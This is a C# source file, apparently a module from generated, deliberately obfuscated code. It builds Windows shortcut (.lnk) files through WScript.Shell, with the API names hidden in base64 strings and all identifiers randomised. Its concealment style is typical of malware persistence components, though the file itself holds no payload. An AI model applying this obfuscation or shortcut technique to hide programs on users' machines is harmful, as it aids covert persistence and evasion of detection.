using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace PbjBzLsVOvNrzQ;

public class mqdnfCIjhG
{
	[ComImport]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	[TypeLibType(4160)]
	private interface erFrdgeJJqMubS
	{
		[DispId(0)]
		string APmqQTeeNFkcyj
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string gGBgJYWYhgOLb
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string XQZDMuivXvXSz
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string xgEwZocRdhuzQ
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string uakxnOfxKc
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string jntdzUEhUX
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string yRwSEygZeBp
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int wStsWTkrZQtQ
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string vRVfnWHGkqYJa
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(2000)]
		[TypeLibFunc(64)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type qawOYidNKOkZj = Type.GetTypeFromProgID(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("V1NjcmlwdC5TaGVsbA=="));

	private static object qORGDxpfXEIQ = Activator.CreateInstance(qawOYidNKOkZj);

	public static void oIbZaRuoJQwtj(string IvGbMcXpJiX, string mfFTmSpgMhYcBQ, string orntSSoAzgE, string TrFEyuaDKhMDmvK, string EqmLLFyYWhjXw, string TstEjohZtBxsVH, string ybGgaFnhxbJI)
	{
		try
		{
			erFrdgeJJqMubS erFrdgeJJqMubS = (erFrdgeJJqMubS)qawOYidNKOkZj.InvokeMember(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, qORGDxpfXEIQ, new object[1] { IvGbMcXpJiX });
			erFrdgeJJqMubS.XQZDMuivXvXSz = EqmLLFyYWhjXw;
			erFrdgeJJqMubS.xgEwZocRdhuzQ = TstEjohZtBxsVH;
			erFrdgeJJqMubS.yRwSEygZeBp = mfFTmSpgMhYcBQ;
			erFrdgeJJqMubS.vRVfnWHGkqYJa = TrFEyuaDKhMDmvK;
			erFrdgeJJqMubS.gGBgJYWYhgOLb = orntSSoAzgE;
			if (!string.IsNullOrEmpty(ybGgaFnhxbJI))
			{
				erFrdgeJJqMubS.uakxnOfxKc = ybGgaFnhxbJI;
			}
			erFrdgeJJqMubS.Save();
		}
		catch (Exception ex)
		{
			if (oIxRFVSIpmRuMqIJ.TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(oIxRFVSIpmRuMqIJ.lNABZjYJLaAdehz, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
